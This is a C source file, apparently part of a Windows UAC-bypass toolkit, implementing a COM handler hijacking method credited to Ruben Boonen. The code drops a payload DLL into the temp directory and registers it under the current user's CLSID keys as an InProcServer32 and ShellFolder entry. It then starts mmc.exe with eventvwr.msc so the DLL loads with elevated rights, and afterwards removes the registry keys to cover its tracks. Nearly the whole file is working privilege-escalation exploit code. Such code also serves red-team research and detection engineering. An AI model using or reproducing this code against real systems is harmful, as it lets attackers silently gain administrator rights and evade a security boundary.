/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2017 - 2019
*
*  TITLE:       B33F.C
*
*  VERSION:     3.17
*
*  DATE:        18 Mar 2019
*
*  UAC bypass method from Ruben Boonen aka b33f.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmCOMHandlersMethod
*
* Purpose:
*
* Bypass UAC using COM handlers hijacking.
* https://github.com/FuzzySecurity/DefCon25/blob/master/DefCon25_UAC-0day-All-Day_v1.2.pdf
*
*/
NTSTATUS ucmCOMHandlersMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;

    SIZE_T   sz = 0;
    HKEY     hKey = NULL;
    LRESULT  lResult;
    DWORD    dwAttributes = 0xF090013D; //combination of SFGAO flags

    WCHAR szBuffer[MAX_PATH * 2], szRegBuffer[MAX_PATH * 4];

    do {

        //
        // Drop payload dll to the %temp%
        //
        _strcpy(szBuffer, g_ctx->szTempDirectory);
        _strcat(szBuffer, MYSTERIOUSCUTETHING);
        _strcat(szBuffer, TEXT(".dll"));
        if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize))
            break;

        //
        // Construct COM handler registry entry.
        //
        // 1. Create CLSID\{GUID}\InProcServer32 key and add values.
        //
        RtlSecureZeroMemory(&szRegBuffer, sizeof(szRegBuffer));
        _strcpy(szRegBuffer, T_REG_SOFTWARECLASSESCLSID);
        _strcat(szRegBuffer, T_CLSID_EVENTVWR_BYPASS);
        _strcat(szRegBuffer, T_REG_INPROCSERVER32);

        hKey = NULL;
        lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szRegBuffer, 0, NULL,
            REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
        if (lResult == ERROR_SUCCESS) {

            //
            // Set Default value to point on payload dll.
            //
            sz = (1 + _strlen(szBuffer)) * sizeof(WCHAR);
            lResult = RegSetValueEx(
                hKey,
                TEXT(""),
                0,
                REG_SZ,
                (BYTE*)szBuffer,
                (DWORD)sz);

            if (lResult == ERROR_SUCCESS) {
                //
                // Set ThreadingModel as Apartment.
                //
                RtlSecureZeroMemory(&szRegBuffer, sizeof(szRegBuffer));
                _strcpy(szRegBuffer, T_APARTMENT);
                sz = (1 + _strlen(szRegBuffer)) * sizeof(WCHAR);
                lResult = RegSetValueEx(
                    hKey,
                    T_THREADINGMODEL,
                    0,
                    REG_SZ,
                    (BYTE*)szRegBuffer,
                    (DWORD)sz);

            }

            RegCloseKey(hKey);
            hKey = NULL;

            if (lResult != ERROR_SUCCESS)
                break;

        }
        else
            break;

        //
        // 2. Create CLSID\{GUID}\ShellFolder key and add values.
        //
        RtlSecureZeroMemory(&szRegBuffer, sizeof(szRegBuffer));
        _strcpy(szRegBuffer, T_REG_SOFTWARECLASSESCLSID);
        _strcat(szRegBuffer, T_CLSID_EVENTVWR_BYPASS);
        _strcat(szRegBuffer, T_REG_SHELLFOLDER);
        hKey = NULL;
        lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szRegBuffer, 0, NULL,
            REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
        if (lResult == ERROR_SUCCESS) {

            //
            // Set HideOnDesktopPerUser as empty.
            //
            sz = 0;
            lResult = RegSetValueEx(
                hKey,
                T_HIDEONDESKTOPPERUSER,
                0,
                REG_SZ,
                NULL,
                (DWORD)sz);

            if (lResult == ERROR_SUCCESS) {

                //
                // Set attributes value.
                //
                lResult = RegSetValueEx(
                    hKey,
                    T_ATTRIBUTES,
                    0,
                    REG_DWORD,
                    (BYTE*)&dwAttributes,
                    sizeof(DWORD));
            }

            RegCloseKey(hKey);
            hKey = NULL;

            if (lResult != ERROR_SUCCESS)
                break;

        }
        else
            break;

        //
        // Run target app.
        //
        if (supRunProcess(MMC_EXE, EVENTVWR_MSC))
            MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    if (hKey != NULL)
        RegCloseKey(hKey);

    //
    // Cleanup.
    //
    if (NT_SUCCESS(MethodResult)) {
        RtlSecureZeroMemory(&szRegBuffer, sizeof(szRegBuffer));
        _strcpy(szRegBuffer, T_REG_SOFTWARECLASSESCLSID);
        _strcat(szRegBuffer, T_CLSID_EVENTVWR_BYPASS);
        _strcat(szRegBuffer, T_REG_SHELLFOLDER);
        RegDeleteKey(HKEY_CURRENT_USER, szRegBuffer);

        RtlSecureZeroMemory(&szRegBuffer, sizeof(szRegBuffer));
        _strcpy(szRegBuffer, T_REG_SOFTWARECLASSESCLSID);
        _strcat(szRegBuffer, T_CLSID_EVENTVWR_BYPASS);
        _strcat(szRegBuffer, T_REG_INPROCSERVER32);
        RegDeleteKey(HKEY_CURRENT_USER, szRegBuffer);

        RtlSecureZeroMemory(&szRegBuffer, sizeof(szRegBuffer));
        _strcpy(szRegBuffer, T_REG_SOFTWARECLASSESCLSID);
        _strcat(szRegBuffer, T_CLSID_EVENTVWR_BYPASS);
        RegDeleteKey(HKEY_CURRENT_USER, szRegBuffer);
    }

    return MethodResult;
}
